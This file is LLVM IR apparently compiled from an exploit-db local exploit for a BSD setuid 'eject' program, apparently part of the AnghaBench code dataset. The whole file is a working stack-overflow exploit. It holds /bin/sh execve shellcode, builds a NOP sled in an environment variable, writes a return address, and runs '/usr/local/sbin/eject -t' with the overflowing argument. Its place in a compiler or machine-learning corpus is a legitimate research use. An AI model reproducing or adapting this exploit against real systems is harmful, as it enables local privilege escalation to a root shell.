; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/local/extr_3578.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/local/extr_3578.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@LEN = common dso_local global i32 0, align 4
@__const.main.shellcode = private unnamed_addr constant [38 x i8] c"\EB\17[1\C0\88C\07\89[\08\89C\0CP\8DS\08RS\B0;P\CD\80\E8\E4\FF\FF\FF/bin/sh\00", align 16
@NOP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [6 x i8] c"BLEH=\00", align 1
@.str.1 = private unnamed_addr constant [22 x i8] c"/usr/local/sbin/eject\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"-t\00", align 1
@environ = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [4 x i8*], align 16
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [38 x i8], align 16
  %9 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %10 = load i32, i32* @LEN, align 4
  %11 = zext i32 %10 to i64
  %12 = call i8* @llvm.stacksave()
  store i8* %12, i8** %2, align 8
  %13 = alloca i8, i64 %11, align 16
  store i64 %11, i64* %3, align 8
  %14 = bitcast [38 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %14, i8* align 16 getelementptr inbounds ([38 x i8], [38 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 38, i1 false)
  store i32 -1077940714, i32* %6, align 4
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  store i8* %15, i8** %4, align 8
  store i32 0, i32* %7, align 4
  br label %16

16:                                               ; preds = %28, %0
  %17 = load i32, i32* %7, align 4
  %18 = getelementptr inbounds [38 x i8], [38 x i8]* %8, i64 0, i64 0
  %19 = call i32 @strlen(i8* %18)
  %20 = sub i32 4096, %19
  %21 = sub i32 %20, 1
  %22 = icmp ult i32 %17, %21
  br i1 %22, label %23, label %31

23:                                               ; preds = %16
  %24 = load i32, i32* @NOP, align 4
  %25 = trunc i32 %24 to i8
  %26 = load i8*, i8** %4, align 8
  %27 = getelementptr inbounds i8, i8* %26, i32 1
  store i8* %27, i8** %4, align 8
  store i8 %25, i8* %26, align 1
  br label %28

28:                                               ; preds = %23
  %29 = load i32, i32* %7, align 4
  %30 = add i32 %29, 1
  store i32 %30, i32* %7, align 4
  br label %16

31:                                               ; preds = %16
  store i32 0, i32* %7, align 4
  br label %32

32:                                               ; preds = %44, %31
  %33 = load i32, i32* %7, align 4
  %34 = getelementptr inbounds [38 x i8], [38 x i8]* %8, i64 0, i64 0
  %35 = call i32 @strlen(i8* %34)
  %36 = icmp ult i32 %33, %35
  br i1 %36, label %37, label %47

37:                                               ; preds = %32
  %38 = load i32, i32* %7, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [38 x i8], [38 x i8]* %8, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = load i8*, i8** %4, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %4, align 8
  store i8 %41, i8* %42, align 1
  br label %44

44:                                               ; preds = %37
  %45 = load i32, i32* %7, align 4
  %46 = add i32 %45, 1
  store i32 %46, i32* %7, align 4
  br label %32

47:                                               ; preds = %32
  %48 = load i8*, i8** %4, align 8
  store i8 0, i8* %48, align 1
  %49 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %50 = call i32 @memcpy(i8* %49, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0), i32 5)
  %51 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %52 = call i32 @putenv(i8* %51)
  %53 = trunc i64 %11 to i32
  %54 = call i32 @memset(i8* %13, i32 65, i32 %53)
  %55 = load i32, i32* %6, align 4
  %56 = and i32 255, %55
  %57 = trunc i32 %56 to i8
  %58 = load i32, i32* @LEN, align 4
  %59 = sub nsw i32 %58, 5
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %13, i64 %60
  store i8 %57, i8* %61, align 1
  %62 = load i32, i32* %6, align 4
  %63 = and i32 65280, %62
  %64 = lshr i32 %63, 8
  %65 = trunc i32 %64 to i8
  %66 = load i32, i32* @LEN, align 4
  %67 = sub nsw i32 %66, 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %13, i64 %68
  store i8 %65, i8* %69, align 1
  %70 = load i32, i32* %6, align 4
  %71 = and i32 16711680, %70
  %72 = lshr i32 %71, 16
  %73 = trunc i32 %72 to i8
  %74 = load i32, i32* @LEN, align 4
  %75 = sub nsw i32 %74, 3
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %13, i64 %76
  store i8 %73, i8* %77, align 1
  %78 = load i32, i32* %6, align 4
  %79 = and i32 -16777216, %78
  %80 = lshr i32 %79, 24
  %81 = trunc i32 %80 to i8
  %82 = load i32, i32* @LEN, align 4
  %83 = sub nsw i32 %82, 2
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %13, i64 %84
  store i8 %81, i8* %85, align 1
  %86 = load i32, i32* @LEN, align 4
  %87 = sub nsw i32 %86, 1
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %13, i64 %88
  store i8 0, i8* %89, align 1
  %90 = getelementptr inbounds [4 x i8*], [4 x i8*]* %5, i64 0, i64 0
  store i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.1, i64 0, i64 0), i8** %90, align 16
  %91 = getelementptr inbounds [4 x i8*], [4 x i8*]* %5, i64 0, i64 1
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i8** %91, align 8
  %92 = getelementptr inbounds [4 x i8*], [4 x i8*]* %5, i64 0, i64 2
  store i8* %13, i8** %92, align 16
  %93 = getelementptr inbounds [4 x i8*], [4 x i8*]* %5, i64 0, i64 3
  store i8* null, i8** %93, align 8
  %94 = getelementptr inbounds [4 x i8*], [4 x i8*]* %5, i64 0, i64 0
  %95 = load i8*, i8** %94, align 16
  %96 = getelementptr inbounds [4 x i8*], [4 x i8*]* %5, i64 0, i64 0
  %97 = load i32, i32* @environ, align 4
  %98 = call i32 @execve(i8* %95, i8** %96, i32 %97)
  store i32 0, i32* %1, align 4
  %99 = load i8*, i8** %2, align 8
  call void @llvm.stackrestore(i8* %99)
  %100 = load i32, i32* %1, align 4
  ret i32 %100
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @strlen(i8*) #3

declare dso_local i32 @memcpy(i8*, i8*, i32) #3

declare dso_local i32 @putenv(i8*) #3

declare dso_local i32 @memset(i8*, i32, i32) #3

declare dso_local i32 @execve(i8*, i8**, i32) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
